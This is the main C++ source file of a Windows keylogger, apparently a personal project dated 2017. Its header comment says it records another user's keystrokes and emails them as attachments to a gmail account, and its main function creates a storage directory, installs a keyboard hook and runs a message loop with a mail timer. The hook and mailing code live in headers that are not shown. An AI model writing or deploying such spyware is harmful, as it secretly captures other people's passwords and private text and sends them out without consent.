/***********************************************
This program is in charge of tracking
another user's keystrokes. It will then
send these keystrokes in a form of
an email attachment to a gmail user.

Created by: Victor Nguyen
Date:            07/13/17
**********************************************/
#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

int main()
{
    MSG Msg;                                           // Get rid of console window message
    IO::MKDir(IO::GetOurPath(true));        // Create the path to the directory
    InstallHook();

    while (GetMessage (&Msg, NULL, 0, 0)){
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
